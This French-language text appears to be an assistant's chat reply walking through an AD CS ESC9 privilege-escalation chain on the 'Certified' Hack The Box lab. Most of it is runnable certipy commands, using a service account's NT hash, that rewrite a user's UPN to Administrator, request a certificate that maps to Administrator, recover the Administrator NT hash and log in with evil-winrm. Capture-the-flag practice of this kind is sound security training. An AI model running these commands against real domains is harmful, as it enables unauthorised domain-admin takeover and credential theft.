ESC9 — Process complet

La logique : le template n'intègre pas l'extension de sécurité qui lie le certificat au compte demandeur. Donc si tu changes le UPN (UserPrincipalName) d'un compte avant de demander le certificat, le certificat sera mappé au compte dont tu as usurpé le UPN.

Prérequis sur Certified :

management_svc a GenericAll sur ca_operator
ca_operator peut enrôler sur le template vulnérable ESC9

Étape 1 — Récupérer le UPN actuel de ca_operator (pour le restaurer après)

bash
certipy-ad account read \
  -u 'management_svc@certified.htb' \
  -hashes ':a091c1832bcdd4677c28b5a6a1295584' \
  -user ca_operator \
  -dc-ip 10.129.66.123

Note le UPN affiché — tu en auras besoin pour le restore.

Étape 2 — Changer le UPN de ca_operator → Administrator

bash
certipy-ad account update \
  -u 'management_svc@certified.htb' \
  -hashes ':a091c1832bcdd4677c28b5a6a1295584' \
  -user ca_operator \
  -upn 'Administrator' \
  -dc-ip 10.129.66.123

Étape 3 — Demander le certificat en tant que ca_operator

bash
certipy-ad req \
  -u 'ca_operator@certified.htb' \
  -p 'PASSWORD_CA_OPERATOR' \
  -ca 'certified-DC01-CA' \
  -template 'NOM_DU_TEMPLATE_ESC9' \
  -dc-ip 10.129.66.123
# → génère ca_operator.pfx mais lié au UPN Administrator

Étape 4 — Restaurer le UPN original de ca_operator (cleanup)

bash
certipy-ad account update \
  -u 'management_svc@certified.htb' \
  -hashes ':a091c1832bcdd4677c28b5a6a1295584' \
  -user ca_operator \
  -upn 'ca_operator@certified.htb' \
  -dc-ip 10.129.66.123

Étape 5 — Authentification avec le certificat

bash
certipy-ad auth \
  -pfx 'ca_operator.pfx' \
  -domain 'certified.htb' \
  -dc-ip 10.129.66.123
# → retourne le hash NT de Administrator

Étape 6 — Connexion

bash
evil-winrm -i 10.129.66.123 \
  -u Administrator \
  -H 'HASH_NT_ADMINISTRATOR'

Résumé de la chaîne :

management_svc (GenericAll sur ca_operator)
→ modifier UPN de ca_operator = Administrator
→ demander certificat avec ca_operator
→ restaurer UPN
→ certipy auth → hash NT Administrator
→ evil-winrm → root.txt

Le point critique : toujours restaurer le UPN à l'étape 4 avant d'authentifier — certaines versions de certipy auth échouent si le UPN est encore modifié au moment de l'auth. Lance-moi la sortie de l'étape 1 pour qu'on confirme le UPN original.
